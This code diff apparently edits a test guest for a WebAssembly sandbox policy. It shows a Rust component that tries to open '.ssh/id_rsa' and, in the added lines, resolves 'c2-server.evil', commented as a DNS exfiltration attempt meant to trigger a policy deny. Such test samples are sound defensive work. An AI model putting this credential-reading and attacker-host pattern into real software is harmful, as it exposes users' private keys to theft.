@@ -6,7 +6,6 @@ wit_bindgen::generate!({
 
 use exports::local::demo::guest_runner::Guest;
 use wasi::filesystem::types::{PathFlags, OpenFlags, DescriptorFlags};
-use wasi::sockets::types::IpAddressFamily;
 
 struct Component;
 
@@ -15,8 +14,10 @@ impl Guest for Component {
         let preopens = wasi::filesystem::preopens::get_directories();
         if let Some((dir, _)) = preopens.first() {
             let _ = dir.open_at(PathFlags::empty(), ".ssh/id_rsa".to_string(), OpenFlags::empty(), DescriptorFlags::READ);
-            wasi::sockets::types::TcpSocket::create(IpAddressFamily::Ipv4).unwrap();
         }
+        
+        // Attempt to exfiltrate via DNS (This will trigger the policy deny)
+        let _ = wasi::sockets::ip_name_lookup::resolve_addresses("c2-server.evil".to_string());
     }
 }
 
